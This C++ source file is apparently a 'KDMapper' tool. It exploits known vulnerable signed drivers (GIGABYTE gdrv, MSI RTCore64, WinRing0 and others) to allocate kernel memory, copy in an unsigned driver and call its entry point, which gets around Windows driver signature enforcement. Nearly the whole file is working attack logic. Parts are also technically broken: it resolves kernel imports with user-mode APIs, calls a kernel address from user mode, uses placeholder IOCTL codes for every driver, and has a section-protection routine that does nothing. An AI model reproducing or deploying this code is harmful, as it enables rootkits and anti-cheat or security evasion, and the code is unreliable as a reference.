#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS(NTAPI* pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

typedef NTSTATUS(NTAPI* pNtDeviceIoControlFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
);

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pNtQueryVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    ULONG MemoryInformationClass,
    PVOID MemoryInformation,
    SIZE_T MemoryInformationLength,
    PSIZE_T ReturnLength
);

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesReaded
);

// Vulnerable driver IOCTL codes for various known vulnerable drivers
#define VULN_DRIVER_IOCTL_ALLOCATE 0x9C402400
#define VULN_DRIVER_IOCTL_MAP 0x9C402404
#define VULN_DRIVER_IOCTL_FREE 0x9C402408
#define VULN_DRIVER_IOCTL_CALL 0x9C40240C

// Known vulnerable drivers
const wchar_t* g_VulnerableDrivers[] = {
    L"\\\\.\\gdrv",           // GIGABYTE gdrv.sys
    L"\\\\.\\AsusIO",         // ASUS
    L"\\\\.\\DBKDrvr",        // DBK64 (Cheat Engine)
    L"\\\\.\\MSIO",           // MSI Afterburner
    L"\\\\.\\RTCore64",       // MSI RTCore64.sys
    L"\\\\.\\WinRing0_1_2_0", // WinRing0
    L"\\\\.\\PhyMemory",      // Physical memory access
    NULL
};

class KernelMapper {
private:
    HANDLE m_hDriver;
    pNtCreateFile m_NtCreateFile;
    pNtDeviceIoControlFile m_NtDeviceIoControlFile;
    pNtQuerySystemInformation m_NtQuerySystemInformation;
    pNtQueryVirtualMemory m_NtQueryVirtualMemory;
    pNtReadVirtualMemory m_NtReadVirtualMemory;
    
    ULONG_PTR m_AllocatedAddress;
    SIZE_T m_AllocatedSize;
    ULONG_PTR m_MappedAddress;
    
    ULONG_PTR FindKernelBase() {
        ULONG Size = 0;
        m_NtQuerySystemInformation(11, NULL, 0, &Size);
        
        std::vector<BYTE> Buffer(Size);
        if (m_NtQuerySystemInformation(11, Buffer.data(), Size, &Size) != 0) {
            return 0;
        }
        
        PRTL_PROCESS_MODULES Modules = (PRTL_PROCESS_MODULES)Buffer.data();
        
        for (ULONG i = 0; i < Modules->NumberOfModules; i++) {
            std::string ModuleName = (char*)Modules->Modules[i].FullPathName;
            
            if (ModuleName.find("ntoskrnl.exe") != std::string::npos) {
                return (ULONG_PTR)Modules->Modules[i].ImageBase;
            }
        }
        
        return 0;
    }
    
    BOOL FindVulnerableDriver() {
        int i = 0;
        while (g_VulnerableDrivers[i] != NULL) {
            HANDLE hDevice = CreateFileW(g_VulnerableDrivers[i], 
                                         GENERIC_READ | GENERIC_WRITE,
                                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                                         NULL, OPEN_EXISTING, 0, NULL);
            
            if (hDevice != INVALID_HANDLE_VALUE) {
                m_hDriver = hDevice;
                wprintf(L"[+] Found vulnerable driver: %s\n", g_VulnerableDrivers[i]);
                return TRUE;
            }
            i++;
        }
        return FALSE;
    }
    
    BOOL AllocateKernelMemory(SIZE_T Size) {
        typedef struct {
            ULONG_PTR Address;
            SIZE_T Size;
        } AllocRequest;
        
        AllocRequest Request = {0};
        Request.Size = Size;
        
        DWORD BytesReturned = 0;
        BOOL Result = DeviceIoControl(m_hDriver, VULN_DRIVER_IOCTL_ALLOCATE,
                                      &Request, sizeof(Request),
                                      &Request, sizeof(Request),
                                      &BytesReturned, NULL);
        
        if (Result) {
            m_AllocatedAddress = Request.Address;
            m_AllocatedSize = Size;
            return TRUE;
        }
        
        return FALSE;
    }
    
    BOOL MapKernelMemory(ULONG_PTR PhysicalAddress, SIZE_T Size, ULONG_PTR* VirtualAddress) {
        typedef struct {
            ULONG_PTR PhysicalAddress;
            SIZE_T Size;
            ULONG_PTR VirtualAddress;
        } MapRequest;
        
        MapRequest Request = {0};
        Request.PhysicalAddress = PhysicalAddress;
        Request.Size = Size;
        
        DWORD BytesReturned = 0;
        BOOL Result = DeviceIoControl(m_hDriver, VULN_DRIVER_IOCTL_MAP,
                                      &Request, sizeof(Request),
                                      &Request, sizeof(Request),
                                      &BytesReturned, NULL);
        
        if (Result) {
            *VirtualAddress = Request.VirtualAddress;
            return TRUE;
        }
        
        return FALSE;
    }
    
    BOOL FreeKernelMemory(ULONG_PTR Address, SIZE_T Size) {
        typedef struct {
            ULONG_PTR Address;
            SIZE_T Size;
        } FreeRequest;
        
        FreeRequest Request = {0};
        Request.Address = Address;
        Request.Size = Size;
        
        DWORD BytesReturned = 0;
        return DeviceIoControl(m_hDriver, VULN_DRIVER_IOCTL_FREE,
                              &Request, sizeof(Request),
                              NULL, 0,
                              &BytesReturned, NULL);
    }
    
    VOID RelocateImage(PBYTE ImageBase, ULONG_PTR OldBase, ULONG_PTR NewBase) {
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
        PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
        
        PIMAGE_BASE_RELOCATION RelocBlock = (PIMAGE_BASE_RELOCATION)(ImageBase + 
            NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        
        ULONG_PTR Delta = NewBase - OldBase;
        
        while (RelocBlock->VirtualAddress != 0) {
            DWORD NumEntries = (RelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD RelocEntries = (PWORD)((PBYTE)RelocBlock + sizeof(IMAGE_BASE_RELOCATION));
            
            for (DWORD i = 0; i < NumEntries; i++) {
                WORD Type = RelocEntries[i] >> 12;
                WORD Offset = RelocEntries[i] & 0xFFF;
                
                if (Type == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR* FixupAddress = (ULONG_PTR*)((PBYTE)ImageBase + RelocBlock->VirtualAddress + Offset);
                    *FixupAddress += Delta;
                } else if (Type == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD* FixupAddress = (DWORD*)((PBYTE)ImageBase + RelocBlock->VirtualAddress + Offset);
                    *FixupAddress += (DWORD)Delta;
                }
            }
            
            RelocBlock = (PIMAGE_BASE_RELOCATION)((PBYTE)RelocBlock + RelocBlock->SizeOfBlock);
        }
    }
    
    BOOL ResolveImports(PBYTE ImageBase) {
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
        PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
        
        PIMAGE_IMPORT_DESCRIPTOR ImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(ImageBase + 
            NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        
        while (ImportDesc->Name != 0) {
            PCHAR ModuleName = (PCHAR)(ImageBase + ImportDesc->Name);
            HMODULE hModule = GetModuleHandleA(ModuleName);
            
            if (!hModule) {
                hModule = LoadLibraryA(ModuleName);
            }
            
            if (!hModule) {
                printf("[!] Failed to load module: %s\n", ModuleName);
                return FALSE;
            }
            
            PIMAGE_THUNK_DATA Thunk = (PIMAGE_THUNK_DATA)(ImageBase + ImportDesc->OriginalFirstThunk);
            PIMAGE_THUNK_DATA FuncThunk = (PIMAGE_THUNK_DATA)(ImageBase + ImportDesc->FirstThunk);
            
            while (Thunk->u1.AddressOfData != 0) {
                ULONG_PTR FunctionAddress = 0;
                
                if (Thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    // Import by ordinal
                    FunctionAddress = (ULONG_PTR)GetProcAddress(hModule, 
                        (LPCSTR)(Thunk->u1.Ordinal & 0xFFFF));
                } else {
                    // Import by name
                    PIMAGE_IMPORT_BY_NAME ImportByName = (PIMAGE_IMPORT_BY_NAME)(ImageBase + Thunk->u1.AddressOfData);
                    FunctionAddress = (ULONG_PTR)GetProcAddress(hModule, ImportByName->Name);
                }
                
                if (!FunctionAddress) {
                    printf("[!] Failed to resolve import\n");
                    return FALSE;
                }
                
                FuncThunk->u1.Function = FunctionAddress;
                Thunk++;
                FuncThunk++;
            }
            
            ImportDesc++;
        }
        
        return TRUE;
    }
    
    VOID ProtectSections(PBYTE ImageBase) {
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
        PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
        
        PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
        
        for (WORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
            DWORD OldProtect = 0;
            
            if (Section->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                // Make executable sections writable
                DWORD Protect = PAGE_EXECUTE_READWRITE;
                // In kernel mode, would use MmProtectMdlSystemAddress
            }
            
            Section++;
        }
    }
    
public:
    KernelMapper() : m_hDriver(INVALID_HANDLE_VALUE), 
                     m_AllocatedAddress(0), 
                     m_AllocatedSize(0),
                     m_MappedAddress(0) {
        
        m_NtCreateFile = (pNtCreateFile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateFile");
        m_NtDeviceIoControlFile = (pNtDeviceIoControlFile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtDeviceIoControlFile");
        m_NtQuerySystemInformation = (pNtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");
        m_NtQueryVirtualMemory = (pNtQueryVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryVirtualMemory");
        m_NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtReadVirtualMemory");
    }
    
    ~KernelMapper() {
        if (m_hDriver != INVALID_HANDLE_VALUE) {
            CloseHandle(m_hDriver);
        }
    }
    
    BOOL MapDriver(std::vector<BYTE>& DriverImage) {
        printf("[*] Looking for vulnerable driver...\n");
        
        if (!FindVulnerableDriver()) {
            printf("[!] No vulnerable driver found\n");
            return FALSE;
        }
        
        // Parse driver image
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DriverImage.data();
        PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)(DriverImage.data() + DosHeader->e_lfanew);
        
        SIZE_T ImageSize = NtHeaders->OptionalHeader.SizeOfImage;
        ULONG_PTR ImageBase = NtHeaders->OptionalHeader.ImageBase;
        
        printf("[*] Driver image size: 0x%llX\n", ImageSize);
        printf("[*] Allocating kernel memory...\n");
        
        // Allocate kernel memory
        if (!AllocateKernelMemory(ImageSize)) {
            printf("[!] Failed to allocate kernel memory\n");
            return FALSE;
        }
        
        printf("[+] Allocated at: 0x%llX\n", m_AllocatedAddress);
        
        // Get physical address
        printf("[*] Mapping physical memory...\n");
        
        if (!MapKernelMemory(m_AllocatedAddress, ImageSize, &m_MappedAddress)) {
            printf("[!] Failed to map kernel memory\n");
            FreeKernelMemory(m_AllocatedAddress, ImageSize);
            return FALSE;
        }
        
        printf("[+] Mapped to: 0x%llX\n", m_MappedAddress);
        
        // Copy driver to kernel memory
        printf("[*] Copying driver to kernel...\n");
        
        PBYTE KernelBuffer = (PBYTE)m_MappedAddress;
        
        // Copy headers
        memcpy(KernelBuffer, DriverImage.data(), NtHeaders->OptionalHeader.SizeOfHeaders);
        
        // Copy sections
        PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
        for (WORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++) {
            if (Section->SizeOfRawData) {
                memcpy(KernelBuffer + Section->VirtualAddress, 
                       DriverImage.data() + Section->PointerToRawData, 
                       Section->SizeOfRawData);
            }
            Section++;
        }
        
        // Relocate if needed
        if (m_AllocatedAddress != ImageBase) {
            printf("[*] Relocating driver (0x%llX -> 0x%llX)\n", ImageBase, m_AllocatedAddress);
            RelocateImage(KernelBuffer, ImageBase, m_AllocatedAddress);
        }
        
        // Resolve imports
        printf("[*] Resolving imports...\n");
        
        if (!ResolveImports(KernelBuffer)) {
            printf("[!] Failed to resolve imports\n");
            FreeKernelMemory(m_AllocatedAddress, ImageSize);
            return FALSE;
        }
        
        // Get DriverEntry
        ULONG_PTR DriverEntry = m_AllocatedAddress + NtHeaders->OptionalHeader.AddressOfEntryPoint;
        
        // Create fake driver object
        // This is simplified - real implementation would allocate DRIVER_OBJECT
        
        printf("[*] Calling DriverEntry at 0x%llX...\n", DriverEntry);
        
        // Call DriverEntry
        typedef NTSTATUS(*DriverEntryPtr)(PVOID DriverObject, PVOID RegistryPath);
        DriverEntryPtr Entry = (DriverEntryPtr)DriverEntry;
        
        NTSTATUS Status = Entry(NULL, NULL);
        
        if (Status == 0) {
            printf("[+] Driver mapped successfully!\n");
            return TRUE;
        } else {
            printf("[!] DriverEntry returned 0x%X\n", Status);
            FreeKernelMemory(m_AllocatedAddress, ImageSize);
            return FALSE;
        }
    }
    
    BOOL UnmapDriver() {
        if (m_AllocatedAddress && m_AllocatedSize) {
            printf("[*] Freeing kernel memory...\n");
            return FreeKernelMemory(m_AllocatedAddress, m_AllocatedSize);
        }
        return FALSE;
    }
};

// Read driver file
std::vector<BYTE> ReadDriverFile(const char* Filename) {
    FILE* File = fopen(Filename, "rb");
    if (!File) {
        return std::vector<BYTE>();
    }
    
    fseek(File, 0, SEEK_END);
    long Size = ftell(File);
    fseek(File, 0, SEEK_SET);
    
    std::vector<BYTE> Buffer(Size);
    fread(Buffer.data(), 1, Size, File);
    fclose(File);
    
    return Buffer;
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("   KDMapper - Kernel Driver Mapper\n");
    printf("========================================\n\n");
    
    if (argc < 2) {
        printf("Usage: %s <driver.sys>\n", argv[0]);
        printf("Example: %s SecureBridge.sys\n", argv[0]);
        system("pause");
        return 1;
    }
    
    // Enable SeLoadDriverPrivilege
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        
        if (LookupPrivilegeValue(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
        
        CloseHandle(hToken);
    }
    
    // Read driver file
    printf("[*] Reading driver: %s\n", argv[1]);
    std::vector<BYTE> DriverImage = ReadDriverFile(argv[1]);
    
    if (DriverImage.empty()) {
        printf("[!] Failed to read driver file\n");
        system("pause");
        return 1;
    }
    
    printf("[+] Driver size: %zu bytes\n", DriverImage.size());
    
    // Map kernel driver
    KernelMapper Mapper;
    
    if (Mapper.MapDriver(DriverImage)) {
        printf("\n[+] Driver mapped successfully!\n");
        printf("[*] Press any key to unload...\n");
        system("pause >nul");
        
        Mapper.UnmapDriver();
        printf("[*] Driver unmapped\n");
    } else {
        printf("\n[!] Failed to map driver\n");
    }
    
    system("pause");
    return 0;
}